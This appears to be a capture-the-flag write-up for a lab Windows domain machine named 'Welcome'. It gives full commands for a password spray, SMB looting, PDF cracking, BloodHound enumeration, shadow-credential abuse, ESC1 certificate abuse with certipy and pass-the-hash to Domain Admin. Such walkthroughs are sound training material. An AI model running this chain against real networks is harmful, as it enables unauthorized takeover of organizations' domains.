# Welcome

## Enumeration&#x20;

### Nmap scan

```
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 126
88/tcp    open  kerberos-sec     syn-ack ttl 126
135/tcp   open  msrpc            syn-ack ttl 126
139/tcp   open  netbios-ssn      syn-ack ttl 126
389/tcp   open  ldap             syn-ack ttl 126
445/tcp   open  microsoft-ds     syn-ack ttl 126
464/tcp   open  kpasswd5         syn-ack ttl 126
593/tcp   open  http-rpc-epmap   syn-ack ttl 126
636/tcp   open  ldapssl          syn-ack ttl 126
3268/tcp  open  globalcatLDAP    syn-ack ttl 126
3269/tcp  open  globalcatLDAPssl syn-ack ttl 126
3389/tcp  open  ms-wbt-server    syn-ack ttl 126
5985/tcp  open  wsman            syn-ack ttl 126
9389/tcp  open  adws             syn-ack ttl 126
49664/tcp open  unknown          syn-ack ttl 126
49667/tcp open  unknown          syn-ack ttl 126
49676/tcp open  unknown          syn-ack ttl 126
49681/tcp open  unknown          syn-ack ttl 126
49717/tcp open  unknown          syn-ack ttl 126
49734/tcp open  unknown          syn-ack ttl 126


```



### Assumed breached credentials&#x20;

```
e.hills:Il0vemyj0b2025!
```

copy the domain users with the help of nxc ldap and e.hills credentials&#x20;

```
Command:- nxc ldap 10.1.95.68 -u e.hills -p 'Il0vemyj0b2025!' --users
```

### Port 445 - SMB&#x20;

User e.hiils has read access over Human Resources share&#x20;

<figure><img src="../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

There are few interesting files in the share. Download all of them.

```
Command:- smbclient //10.1.95.68/'Human Resources' -U e.hills%'Il0vemyj0b2025!'

to download the files
Command:- mget *
```

<figure><img src="../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

File start guide.pdf has password protection so use john to crack it&#x20;

<figure><img src="../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

Start guide document contains clear text default password,&#x20;

<figure><img src="../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

### Password spray attack&#x20;

Found a.harris uses default password

```
Command: nxc smb 10.1.95.68 -u users.txt -p 'Redacted' --continue-on-success | grep '[+]'
```

<figure><img src="../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>

### Port 5985 - Winrm (user.txt)

<figure><img src="../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation&#x20;

bloodhound data revealed that user a.harris has generic all privilege on i.park, and i.park has force change password privileges on service accounts svc\_ca and svc\_web. Looking at the names of the service accounts able to identify that one of them is related to certificate authority

```
Command:- bloodhound-python -u a.harris -p 'Redacted' -d 'welcome.local' -ns '10.1.95.68' -c all --zip
```

<figure><img src="../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

First, abusing generic all permissions on i.park with certipy-ad to get the hash

```
certipy-ad shadow -u a.harris -p 'Redacted' -dc-ip 10.1.95.68 -account 'i.park' auto
```

<figure><img src="../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

Changing the passwords for service accounts via rpcclient&#x20;

<figure><img src="../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

Searched for misconfigured certificate templates and identified a vulnerability conforming to ESC1. Using Certipy-ad, abused the ESC1 misconfiguration to request a certificate as the Domain Administrator.

```
Command:- certipy-ad find -u svc_ca@welcome.local -p 'Password@123' -dc-ip 10.1.95.68 -vulnerable
```

<figure><img src="../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

```
Command:- certipy-ad req -u svc_ca -p 'Password@123' -ca 'WELCOME-CA' -target-ip '10.1.95.68' -template 'Welcome-Template' -upn administrator -dc-ip 10.1.95.68 


certipy-ad auth -pfx administrator.pfx -domain welcome.local -u administrator -dc-ip 10.1.95.68
```



<figure><img src="../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

### Root.txt

Used pass the hash attack to gain access as administrator on port 5985&#x20;

<figure><img src="../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>



















